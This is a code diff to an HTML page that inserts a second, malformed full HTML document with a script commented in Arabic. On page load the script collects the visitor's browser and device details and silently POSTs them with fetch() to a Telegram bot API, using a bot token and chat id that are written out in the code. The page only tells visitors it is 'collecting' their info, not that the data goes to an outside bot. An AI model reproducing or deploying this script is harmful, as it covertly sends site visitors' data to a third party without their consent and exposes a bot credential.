@@ -40,5 +40,49 @@
       document.getElementById('result').textContent = JSON.stringify(info, null, 2);
     });
   </script>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Collecting Device Info</title>
+</head>
+<body>
+  <h1>Collecting your device info...</h1>
+
+  <!-- هنا مكان السكربت -->
+  <script>
+    // بيانات الجهاز
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookiesEnabled: navigator.cookieEnabled,
+      online: navigator.onLine
+    };
+
+    // رابط API تبع بوتك مباشرةً
+    const telegramApi = "https://api.telegram.org/bot6766596357:AAHTHT-BIN3rM9UmQ5XMkR4gRLM0NAYk/sendMessage";
+
+    // صيغة الرسالة
+    const message = `
+    📡 New Device Info:
+
+    User Agent: ${deviceInfo.userAgent}
+    Platform: ${deviceInfo.platform}
+    Language: ${deviceInfo.language}
+    Cookies Enabled: ${deviceInfo.cookiesEnabled}
+    Online: ${deviceInfo.online}
+    `;
+
+    // ارسالها مباشرةً للبوت
+    fetch(telegramApi, {
+      method: "POST",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: `chat_id=6676554646&text=${encodeURIComponent(message)}`
+    });
+  </script>
+
+</body>
+</html>
 </body>
 </html>
